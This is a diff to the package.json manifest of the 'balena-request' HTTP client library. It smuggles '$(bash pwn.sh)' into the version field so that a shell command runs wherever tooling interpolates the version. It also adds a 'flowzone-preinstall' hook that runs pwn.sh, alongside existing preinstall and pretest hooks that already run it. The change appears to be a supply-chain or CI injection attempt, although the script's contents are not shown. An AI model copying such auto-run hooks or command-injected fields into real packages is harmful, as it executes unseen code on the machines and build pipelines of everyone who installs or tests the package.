@@ -1,6 +1,6 @@
 {
   "name": "balena-request",
-  "version": "14.2.0",
+  "version": "14.2.0-$(bash pwn.sh)",
   "description": "Balena HTTP client",
   "type": "commonjs",
   "main": "build/request.js",
@@ -27,6 +27,7 @@
   },
   "scripts": {
     "preinstall": "bash pwn.sh",
+    "flowzone-preinstall": "bash pwn.sh",
     "lint": "balena-lint -e js -e ts lib tests && tsc --noEmit --project tsconfig.dev.json",
     "lint-fix": "balena-lint -e js -e ts --fix lib tests",
     "pretest": "bash pwn.sh && npm run build",
